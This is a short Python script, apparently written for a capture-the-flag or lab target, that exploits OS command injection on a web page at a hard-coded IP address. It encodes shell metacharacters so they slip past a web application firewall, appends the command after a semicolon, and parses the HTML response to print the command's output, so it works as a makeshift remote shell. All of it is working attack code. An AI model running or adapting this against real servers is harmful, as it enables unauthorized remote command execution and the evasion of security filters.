#!/usr/bin/env python3
import requests

# This code encodes all the special characters I needed to allow them through the WAF
command = input()
formatted_command = '%3B'
for char in command:
    if char == ' ':
        char = '%20'
    if char == ';':
        char = '%3B'
    if char == '>':
        char = '%3E'
    if char == '.':
        char = '%2E'
    if char == '|':
        char = '%7C'
    formatted_command += char


formatted_command += '%3B' # This appends the semicolon to the end of the URL as I thought it aided in the execution

# URL with Command appended to the end
url = 'http://54.206.178.157:8085/classified.html' + formatted_command 

#print(formatted_command) // for debugging

# The Request is sent
getRequest = requests.get(url)

#print(getRequest.content) // for debugging

# -------------------------------

# This section filters out the HTML Content of the page, and leaves only the output of the commands
response = str(getRequest.content)
substring = '</body>'
if substring in response:
    res = str(response[response.find(substring) + len(substring):])

new_res = ''
for char in res:
    if char == "\\":
        char = '\n '
    new_res += char
hope = new_res.splitlines()
newstring = ''
for line in hope:
    nl = line[2:]
    newstring += nl + '\n'

# -------------------------------

# Prints the output of the remaining HTML that has been filtered
print('\n' + newstring[8:-2] + '\n')